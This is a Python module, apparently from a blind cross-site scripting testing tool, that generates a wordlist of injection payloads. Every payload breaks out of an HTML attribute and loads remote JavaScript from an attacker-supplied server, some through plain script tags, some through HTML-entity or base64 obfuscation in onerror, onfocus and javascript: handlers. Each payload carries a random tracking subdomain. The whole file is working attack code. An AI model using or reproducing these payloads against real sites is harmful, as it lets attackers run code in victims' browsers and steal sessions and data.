from lib import helpers
from base64 import b64encode


def generate(xss_server):
    wordlist = []

    wordlist += script_tag(xss_server)
    wordlist += b64_obfuscated(xss_server)

    return wordlist


def script_tag(xss_server):
    script_tag_templates = [
        '"><script src=https://{xss_server}></script>',
        '"><script>$.getScript(\'//{xss_server}\')</script>',
        '"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//{xss_server}");a.send();</script>',
        '"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;{xss_server}&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">'
    ]
    wordlist = []

    for template in script_tag_templates:
        word = {}
        word['identifier'] = helpers.randomString()
        word['payload'] = template.replace('{xss_server}', word['identifier'] + '.' + xss_server)
        wordlist.append(word)

    return wordlist


def b64_obfuscated(xss_server):
    payload_templates = [
        'eval(\'var a=document.createElement(\\\'script\\\');a.src=\\\'https://{xss_server}\\\';document.body.appendChild(a)\');',
        '$.getScript(\'//{xss_server}\');;'
    ]
    tag_templates = [
        'javascript:{b64_payload}',
        '"><input onfocus=eval(atob(this.id)) id={b64_payload} autofocus>',
        '"><img src=1 id={b64_payload} onerror=eval(atob(this.id))>',
        '"><video><source onerror=eval(atob(this.id)) id={b64_payload}>'
    ]
    wordlist = []
    for template in tag_templates:
        for payload in payload_templates:
            word = {}
            word['identifier'] = helpers.randomString()
            payload = payload.replace('{xss_server}', word['identifier'] + '.' + xss_server)
            payload = b64encode(bytes(payload, 'ascii')).decode('ascii')
            word['payload'] = template.replace('{b64_payload}', payload)
            wordlist.append(word)

    return wordlist
